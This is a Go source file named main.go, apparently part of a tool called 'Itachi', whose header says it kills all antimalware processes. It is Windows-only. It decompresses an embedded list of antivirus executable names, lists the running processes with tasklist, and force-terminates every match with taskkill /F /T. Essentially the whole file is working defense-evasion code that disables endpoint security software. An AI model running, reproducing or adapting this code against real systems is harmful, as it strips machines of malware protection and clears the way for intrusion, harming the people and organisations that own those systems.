/***************************************************************
*
* Itachi (c) 2022 by Mikhail Kondrashin (mkondrashin@gmail.com)
*
* main.go - antiav - kill all antimalware processes
*
***************************************************************/

package main

import (
	"bytes"
	"compress/gzip"
	_ "embed"
	"encoding/csv"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

//go:embed AvList.txt.gz
var avListGZ []byte

//var f *os.File

func main() {
	if runtime.GOOS != "windows" {
		fmt.Println("This application should run only under Windows")
		os.Exit(1)
	}
	// 	var err error
	//	f, err = os.Create("C:\\antiav.txt")
	//	if err != nil {
	//		panic(err)
	//	}
	//	defer f.Close()
	avList := GetAVList()
	tasks := TasksList()
	list := IterateProcess(tasks)
	for _, each := range list {
		if avList.isAV(each) {
			TaskKill(each)
		} else {
			//fmt.Fprintf(f, "Skip %s\n", each)
		}
	}
}

func TaskKill(name string) {
	name = strings.TrimSpace(name)
	name = strings.ReplaceAll(name, " ", "")
	//	fmt.Fprintf(f, "Kill: \"%s\"\n", name)
	cmd := exec.Command("taskkill.exe", "/IM", name, "/F", "/T")
	output, err := cmd.CombinedOutput()
	if err != nil {
		if strings.Contains(string(output), "not found") {
			return
		}
		fmt.Println("Error: ", err)
	}
	fmt.Println(string(output))
	//	fmt.Fprintf(f, "%s: %s", name, string(output))
}

func TasksList() string {
	cmd := exec.Command("tasklist.exe", "/FO", "CSV")
	output, err := cmd.CombinedOutput()
	if err != nil {
		panic(err)
	}
	fmt.Println(string(output))
	return string(output)
}

func IterateProcess(csvTaskList string) (result []string) {
	r := csv.NewReader(strings.NewReader(csvTaskList))
	records, err := r.ReadAll()
	if err != nil {
		log.Fatal(err)
	}
	for _, line := range records {
		if !strings.HasSuffix(line[0], ".exe") {
			continue
		}
		result = append(result, line[0])
	}
	return
}

type AVList []string

func GetAVList() (result AVList) {
	gz, err := gzip.NewReader(bytes.NewReader(avListGZ))
	if err != nil {
		panic(err)
	}
	unpacked, err := io.ReadAll(gz)
	if err != nil {
		panic(err)
	}
	for _, each := range strings.Split(string(unpacked), "\n") {
		each = strings.TrimSpace(each)
		each = strings.ReplaceAll(each, " ", "")
		result = append(result, each)
	}
	return
}

func (a AVList) isAV(name string) bool {
	name = strings.ToLower(name)
	for _, each := range a {
		if name == each {
			return true
		}
	}
	return false
}
